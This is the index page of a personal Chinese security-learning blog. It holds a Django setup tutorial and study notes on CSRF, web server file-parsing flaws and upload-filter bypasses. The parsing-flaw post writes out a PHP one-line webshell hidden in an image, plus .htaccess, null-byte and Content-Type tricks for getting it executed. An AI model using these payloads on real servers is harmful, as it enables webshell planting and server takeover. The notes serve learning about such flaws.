<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="Hexo Test">
<meta property="og:url" content="http://wcute.github.io/index.html">
<meta property="og:site_name" content="Hexo Test">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo Test">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://wcute.github.io/">





  <title>Hexo Test</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo Test</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Django---简单博客搭建（Django安装）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/Django---简单博客搭建（Django安装）/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:58:44+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="Django-安装"><a href="#Django-安装" class="headerlink" title="Django 安装"></a>Django 安装</h4><ol>
<li>安装<blockquote>
<p>pip install Django==1.10.2</p>
</blockquote>
</li>
<li>查看是否安装成功<blockquote>
<p>python -m django version</p>
</blockquote>
</li>
<li>创建新项目<blockquote>
<p>D:\python&gt;django-admin startproject myblog</p>
</blockquote>
</li>
</ol>
<p>此时自建项目目录生成</p>
<ul>
<li><p>目录结构:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">manage.py            与项目进行交互的命令行工具集的入口</span><br><span class="line"></span><br><span class="line">myblog               项目容器，包含项目最基本的一些配置，目录名不建议修改</span><br><span class="line"></span><br><span class="line">__init__.py          python 中声名模块的文件，默认内容为空</span><br><span class="line"></span><br><span class="line">settings.py          项目总配置文件（数据库、Web应用、时间等配置）</span><br><span class="line"></span><br><span class="line">urls.py              url 配置文件</span><br><span class="line"></span><br><span class="line">wsgi.py              python 与web服务器网关接口</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动django自带的服务器</p>
<blockquote>
<p>python manage.py runserver 【端口】</p>
</blockquote>
</li>
</ul>
<p>显示默认web地址和端口 ，更改端口只需在命令后面加上使用的端口号</p>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-19607cf2914561ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
<h4 id="应用创建"><a href="#应用创建" class="headerlink" title="应用创建"></a>应用创建</h4><p>创建步骤：</p>
<ol>
<li>打开命令行，进入manage.py 的同级目录</li>
<li>输入：python manage.py startapp blog</li>
<li>添加应用名到 settings.py 中的 INSTALLED_APPS里</li>
</ol>
<ul>
<li><p>应用目录结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">migrations     数据移植模块，内容自动生成</span><br><span class="line"></span><br><span class="line">admin.py       后台管理系统配置</span><br><span class="line"></span><br><span class="line">apps.py        该应用的一些配置，Django-1.9以后自动生成</span><br><span class="line"></span><br><span class="line">models.py      数据模块</span><br><span class="line"></span><br><span class="line">tests.py       自动化测试模块，可在此编写测试脚本</span><br><span class="line"></span><br><span class="line">views.py       执行响应的代码所在模块，代码逻辑处理主要地点，大部分代码在此编写</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建第一个响应页面</p>
</li>
</ul>
<ol>
<li>在 blog 的 views.py 编写代码并保存<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line"></span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line"></span><br><span class="line">return HttpResponse(&apos;hello&apos;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>注：每个响应对应一个函数，函数必须返回一个响应<br>函数必须存在一个参数，一般约定为 request<br>每一个响应函数对应一个URL</p>
<ol start="2">
<li>进入 myblog 的配置文件 settings.py，在 INSTALLED_APPS 中添加 blog 应用</li>
<li>进入 myblog 的url配置文件 urls.py，导入模块并配置url</li>
</ol>
<ul>
<li>URL 配置一<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import blog.views as asd</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^admin/&apos;, admin.site.urls),</span><br><span class="line"></span><br><span class="line">url(r&apos;^index/&apos;, asd.index),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>注：URL函数有三个参数：URL（正则），对应方法，名称<br>URL函数存放在 urlpatterns 列表中</p>
<ul>
<li>URL配置二</li>
</ul>
<p>(1)  在 myblog 的 urls.py 中导入 include 模块，并在urlpatterns中添加url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url,include</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^index/&apos;, include(&apos;blog.urls&apos;)),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p>(2) blog目录下创建urls.py 编写 url 访问方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^$&apos;, views.index),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<ol start="4">
<li>启动服务器python manage.py runserver</li>
<li>打开浏览器，访问 <a href="http://127.0.0.1:8000/index/" target="_blank" rel="noopener">http://127.0.0.1:8000/index/</a></li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-4b20e6314620a2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/漏洞学习/文件解析漏洞/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/漏洞学习/文件解析漏洞/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>　　一些特殊文件被<code>IIS</code> <code>Apache</code> <code>Nginx</code>在某种情况下解析成脚本文件格式的漏洞</p>
<h5 id="IIS-6-0解析漏洞"><a href="#IIS-6-0解析漏洞" class="headerlink" title="IIS 6.0解析漏洞"></a>IIS 6.0解析漏洞</h5><ol>
<li><p>目录解析漏洞 <code>/xx.asp/xx.jpg</code></p>
<p>在网站下创建文件夹名字为<code>.asp</code> <code>.asa</code>的文件夹，其目录内的任何扩展名的文件都被<code>iis</code>当做<code>asp</code>文件来解析并执行。因此只要攻击者可以通过该漏洞直接上传图片马，并且可以不需要改后缀名</p>
</li>
<li><p>文件解析 <code>xx.asp;.jpg</code></p>
<p>在iis6.0下，分号后面的不被解析，所以<code>xx.asp;.jpg</code>被解析为<code>asp</code>脚本得以执行。</p>
</li>
<li><p>文件类型解析 <code>.asa</code> <code>.cer</code> <code>.cdx</code></p>
<p>iis 6.0 默认的可执行文件除了<code>asp</code>还包含这三种<code>asa</code>、<code>cer</code>、<code>cdx</code></p>
</li>
</ol>
<h5 id="IIS-7-0-IIS-7-5-Nginx-lt-0-8-37"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-0-8-37" class="headerlink" title="IIS 7.0/IIS 7.5/Nginx &lt;=0.8.37"></a>IIS 7.0/IIS 7.5/Nginx &lt;=0.8.37</h5><p>   在默认<code>Fast-CGI</code>开启状况下,在一个文件路径<code>(/xx.jpg)</code>后面加上<code>/xx.[PHP]</code>会将 <code>/xx.jpg</code> <code>/xx.php</code> 解析为 <code>php</code> 文件。</p>
<p>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾<br>e.g.<br>　　copy xx.jpg/b + yy.txt/a xy.jpg<br>   <code>/b</code> 即二进制<code>[binary]</code>模式<br>   <code>/a</code> 即<code>ascii</code>模式，生成 <code>xx.jpg</code>正常图片文件</p>
<p>   <code>yy.txt</code> 内容 <code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p>
<p>意思为写入一个内容为<code>&lt;?php eval($_POST[cmd])?&gt;</code> 名称为<code>shell.php</code>的文件</p>
<p>找个地方上传<code>xy.jpg</code> ,然后找到 <code>xy.jpg</code> 的地址，在地址后加上 <code>/xx.php</code> 即可执行恶意文本。</p>
<p>此时在图片目录下生成一句话木马 <code>shell.php</code> 密码 <code>cmd</code></p>
<h5 id="Nginx-lt-0-8-37-解析漏洞"><a href="#Nginx-lt-0-8-37-解析漏洞" class="headerlink" title="Nginx &lt;=0.8.37 解析漏洞"></a>Nginx &lt;=0.8.37 解析漏洞</h5><p>在<code>Fast-CGI</code>关闭的情况下，<code>Nginx &lt;=0.8.37</code> 依然存在解析漏洞</p>
<p>在一个文件路径<code>(/xx.jpg)</code>后面加上<code>%00.php</code>会将 <code>/xx.jpg%00.php</code> 解析为 <code>php</code> 文件。</p>
<h5 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h5><p>后缀解析：<code>test.php.x1.x2.x3</code></p>
<p>   Apache将从右至左开始判断后缀，若<code>x3</code>非可识别后缀，再判断<code>x2</code>，直到找到可识别后缀为止，然后将该可识别后缀进解析</p>
<p><code>test.php.x1.x2.x3</code> 则会被解析为<code>php</code></p>
<p><code>php|php3|phtml</code>多可被<code>Apache</code>解析</p>
<p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.</p>
<p>例 <code>cracer.php.owf.rar</code>中 <code>.owf</code>和<code>.rar</code>这两种后缀是apache不可识别解析,apache就会把<code>cracer.php.owf.rar</code>解析成<code>php</code></p>
<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个<code>cracer.php.rara.jpg.png…</code>（把知道的常见后缀都写上…）去测试是否是合法后缀。</p>
<p>如果Apache中<code>.htaccess</code>可被执行并可被上传，那么可以尝试在<code>.htaccess</code>中写入<br>　　<figure class="highlight plain"><figcaption><span>"shell.jpg"> SetHandler application/x-httpd-php 　```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">  然后再上传`shell.jpg`的木马，这样`shell.jpg`就可被解析为PHP文件了。</span><br><span class="line"></span><br><span class="line">    .htaccess文件是Apache服务器中的一个配置文件，负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置</span><br><span class="line"></span><br><span class="line">##### PHP CGI解析漏洞</span><br><span class="line"></span><br><span class="line">当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问`http://www.xxx.com/x.txt/x.php`时，若`x.php`不存在，则PHP会递归向前解析，将`x.txt`当作`php`脚本来解析</span><br><span class="line"></span><br><span class="line">IIS中：`任意文件名/任意文件名.php`就会被解析为`php`</span><br><span class="line"></span><br><span class="line">Nginx中：`任意文件名/任意文件名.php`就会被解析为`php`</span><br><span class="line"></span><br><span class="line">##### 操作系统解析</span><br><span class="line"></span><br><span class="line">  由于windows会将文件的后缀中的空格以及点进行过滤，如果遇到是黑名单校验的，如限制不允许上传PHP文件，而系统又是windows系统，那么我们可以上传`xx.php` ，或者`xx.php.`通过这种方式就可以绕过黑名单检验的文件上传</span><br><span class="line"></span><br><span class="line">##### 文件头欺骗漏洞</span><br><span class="line"></span><br><span class="line">在一句话木马前面加入`GIF89a`，然后将木马保存为图片格式，可以欺骗简单的`waf`。</span><br><span class="line"></span><br><span class="line">##### filepath漏洞</span><br><span class="line"></span><br><span class="line">filepath漏洞主要用来突破服务器自动命名规则，主要有以下两种利用方式：</span><br><span class="line"></span><br><span class="line">  1. 改变文件上传后路径`(filepath)`，可以结合目录解析漏洞，路径`/x.asp/`</span><br><span class="line"></span><br><span class="line">  2. 直接改变文件名称(都是在`filepath`下进行修改)，路径`/x.asp;`</span><br><span class="line"></span><br><span class="line">##### 00截断</span><br><span class="line"></span><br><span class="line">00截断的两种利用方式：</span><br><span class="line"></span><br><span class="line">  1. 更改filename，`xx.php .jpg`在burpsuit中将空格对应的 *hex* `2e`改为`00`</span><br><span class="line"></span><br><span class="line">  2. 更改filename，`xx.php%00.jpg` 在burpsuit中将`%00`进行右键转换`-url-urldecoder`</span><br><span class="line"></span><br><span class="line">##### filetype漏洞</span><br><span class="line"></span><br><span class="line">filetype漏洞主要是针对`content-type`字段，主要有两种利用方式：</span><br><span class="line"></span><br><span class="line">  1. 先上传一个图片，然后将`content-type:images/jpeg`改为`content-type:text/asp`，然后对filename进行`00截断`，将图片内容替换为一句话木马。</span><br><span class="line"></span><br><span class="line">  2. 直接使用burp抓包，得到`post`上传数据后，将`Content-Type: text/plain`改成 `Content-Type: image/gif`。</span><br><span class="line"></span><br><span class="line">##### iconv函数限制上传</span><br><span class="line"></span><br><span class="line">  如果发现不论上传什么文件，上传后的文件都会自动添加一个`.jpg`的后缀，那么可以怀疑是否是使用`iconv`这个函数进行了上传的限制，此时可以使用`80-EF截断`，也就是修改 *HEX* 为`80`到`EF`中的某一个来进行截断，如果真是使用这个函数的话，那么将上传任意文件成功，如上传一个`xx.php `，然后截断抓包将后面的空格对应的十六进制改为`80`到`EF`中的任意一个</span><br><span class="line"></span><br><span class="line">##### 双文件上传</span><br><span class="line"></span><br><span class="line">再一个文件上传的地方，右键审查元素，首先修改`action`为完整路径，然后复制粘贴上传浏览文件`&lt;input ......&gt;`，这样就会出现两个上传框，第一个上传正常文件，第二个选择一句话木马，然后提交。</span><br><span class="line"></span><br><span class="line">##### 表单提交按钮</span><br><span class="line"></span><br><span class="line">我们有时扫描发现上传路径，可是只有一个浏览文件，却没有提交按钮，此时我们就需要写入提交按钮。</span><br><span class="line"></span><br><span class="line">  写入表单：</span><br><span class="line">  F12审查元素，在选择文件表单下面添加提交按钮代码。</span><br><span class="line">　　 ```&lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;xx&quot;&gt;</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/漏洞学习/CSRF漏洞学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/漏洞学习/CSRF漏洞学习/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="CSRF-定义"><a href="#CSRF-定义" class="headerlink" title="CSRF 定义"></a>CSRF 定义</h4><p>跨站请求伪造，是一种“挟持用户”在当前已登录的Web应用程序上执行“非本意的操作”的攻击方法。</p>
<h4 id="CSRF攻击攻击原理及过程"><a href="#CSRF攻击攻击原理及过程" class="headerlink" title="CSRF攻击攻击原理及过程"></a>CSRF攻击攻击原理及过程</h4><ol>
<li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</li>
<li>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</li>
<li>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</li>
<li>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</li>
<li>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 </li>
</ol>
<h4 id="CSRF漏洞的分类及检测挖掘方法"><a href="#CSRF漏洞的分类及检测挖掘方法" class="headerlink" title="CSRF漏洞的分类及检测挖掘方法"></a>CSRF漏洞的分类及检测挖掘方法</h4><ul>
<li>第一种：<br>请求直接是个GET请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。<br>检测方法：<br>网页操作某功能，抓包后，如果发现满足上面条件，然后再去页面测试下，基本就可以确定存在不存在CSRF漏洞了。</li>
<li>第二种：<br>请求是个POST请求，post请求中没有<code>token</code>参数，然后请求也没有验证<code>referer</code>信息。这种是存在CSRF情况最多的一种。<br>检测方法：<br>网页操作某功能，抓包后，如果发现没有<code>token</code>等参数，然后就将<code>referer</code>信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。如果有token等参数，可以尝试将token去掉，然后再将<code>referer</code>也去掉，进行验证。这种CSRF漏洞的利用，是需要在自己服务器构造一个<code>form</code>表单的，然后将服务器<code>form</code>表单的<code>URL</code>作为CSRF攻击进行利用的，或者用<code>js</code>代码生成<code>form</code>表单，或者用<code>ajax</code>实现。</li>
<li>第三种：<br>请求是POST，<code>post</code>请求中没有<code>token</code>参数，但是验证了<code>referer</code>信息。然而可以将<code>post</code>请求改写为<code>get</code>请求，然后通过第一种情况下的那个方法利用。<br>检测方法：<br>就是先执行了第二种的验证后，发现有对CSRF进行防御。然后将post请求改写为GET请求，发现仍然可以成功执行。漏洞成因是因为服务器端接收请求参数的时候，没有严格的用<code>$_POST</code>而是用的类似于<code>$_REQUEST</code>这种<code>post</code>，<code>get</code>请求的参数都可以接收的写法。</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/漏洞学习/上传绕过/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/漏洞学习/上传绕过/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>参考链接：<a href="https://xz.aliyun.com/t/1991" target="_blank" rel="noopener">https://xz.aliyun.com/t/1991</a></p>
<h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><hr>

<p>一般在网页上写一段<code>javascript</code>脚本，检验上传文件的后缀名，白名单或者黑名单形式<br>　　判断方法：浏览加载文件，但还未点击上传按钮时便弹出对话框，例：只允许上传<code>.jpg</code> <code>.jpeg</code> <code>.png</code>后缀名的文件，而此时并没有发送数据包<br>　　绕过方法：先上传 <code>.jpg</code>，burpsuite 抓包，将<code>.jpg</code>修改为 <code>.php</code> <code>.asp</code>等</p>
<h4 id="服务端验证"><a href="#服务端验证" class="headerlink" title="服务端验证"></a>服务端验证</h4><hr>

<ol>
<li><p>文件名验证</p>
<ul>
<li>白名单绕过方法<br>　　一般通过解析漏洞构造，如 <code>%00截断</code>，<code>0x00截断</code>等。<br>　　参考链接： <a href="https://www.jianshu.com/p/224ac688d135" target="_blank" rel="noopener">https://www.jianshu.com/p/224ac688d135</a></li>
<li>黑名单绕过方法<br>　　a. 找容易忽视的后缀名，例 <code>.cer</code> 等<br>　　b. 上传 <code>.htaccess</code><br>　　c. 后缀大小写绕过<br>　　d. 点绕过<br>　　e. 空格绕过<br>　　f. <code>::$DATA</code>绕过<br>　　g. 配合解析漏洞</li>
</ul>
</li>
<li><p>文件内容验证<br>　　  a. 针对文件头 <code>content-type</code> 字段校验<code>（image/gif）</code>绕过方法<br>　　  b. 突破<code>getimagesize()</code><br>　　  c. 突破<code>exif_imagetype()</code><br>　　  d. 二次渲染</p>
</li>
<li><p>WAF 设备验证</p>
</li>
</ol>
<ul>
<li>垃圾数据<br>　　有些主机<code>WAF</code>软件为了不影响<code>web</code>服务器的性能，会对校验的用户数据设置大小上限，比如<code>1M</code>。此种情况可以构造一个大文件，前面<code>1M</code>的内容为垃圾内容，后面才是真正的木马内容，便可绕过WAF对文件内容的校验，也可将垃圾数据放在数据包最开头，绕过对文件名的校验</li>
<li>filename<br>　　  可以参考文件名绕过方法，包括路径等等形式来对这个方法的限制进行绕过。可以考虑的点还有多个文件名，加入路径，利用重名命等。</li>
